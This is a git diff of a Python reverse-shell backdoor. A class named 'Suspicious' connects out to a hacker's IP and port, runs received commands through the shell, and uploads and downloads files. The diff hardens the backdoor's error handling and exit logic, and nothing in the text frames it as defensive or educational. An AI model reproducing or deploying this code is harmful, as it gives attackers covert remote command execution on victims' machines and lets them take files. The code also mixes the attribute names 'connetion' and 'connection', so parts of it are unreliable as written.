@@ -4,6 +4,7 @@
 # ------------------------------- start of code -----------------------------
 
 import os
+import sys
 import json
 import socket
 import base64
@@ -13,11 +14,16 @@ class Suspicious:
     def __init__(self, ip, port):
         self.connetion = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.connection.connect((ip, port))
-        self.connetion.send("[+] Connection Success.\n".encode('utf-8'))
+        # self.connetion.send("[+] Connection Success.\n".encode('utf-8'))
+        # platform = {'aix': "AIX", 'linux': "Linux", 'win32':'Windows', 'cygwin': "Windows.Cygwin", 'darwin': "MacOS"}
+        # self.connetion.send(f"[+] Connected to {platform[sys.platform]} operating system")
 
     def execute_system_commands(self, command):
         # the output data type of the check_output method is byte
-        return subprocess.check_output(command, shell=True).decode('utf-8')
+        try:
+            return subprocess.check_output(command, shell=True).decode('utf-8')
+        except:
+            return "------- [=] Error while executing the command [=] ------"
 
     def changeWorkingDirectory(self, path):
         os.chdir(path)
@@ -51,21 +57,21 @@ class Suspicious:
                 data_received = self.receive_data()
                 if data_received[0].lower() == 'exit':
                     self.connetion.close()
-                    exit()
+                    sys.exit()
                 elif data_received[0].lower() == 'cd' and len(data_received) >1:
                     command_result = self.changeWorkingDirectory(data_received[1])
                 elif data_received[0].lower() == 'download':
-                    command_result = self.read_file(data_received[1])
+                    command_result = self.read_file(data_received[1]).decode()
                 elif data_received[0].lower() == 'upload':
                     command_result = self.download_file(data_received[1], data_received[2])
                 else:
                     command_result = self.execute_system_commands(data_received)
                 self.send_data(command_result)
-            except subprocess.CalledProcessError as error:
-                self.send_data("-------[=] Error => subprocess.CalledProcessError [=] -------")
+            # except subprocess.CalledProcessError as error:
+                # self.send_data("-------[=] Error => subprocess.CalledProcessError [=] -------")
             except Exception as error:
                 self.send_data("---- [=] Error while executing command [=] ----")
-                self.send_data("---- [=] Connection is still intact though [=] ----")
+                # self.send_data("---- [=] Connection is still intact though [=] ----")
 
 # these ip and port values are of hackers system values
 backdoor = Suspicious(ip, port)
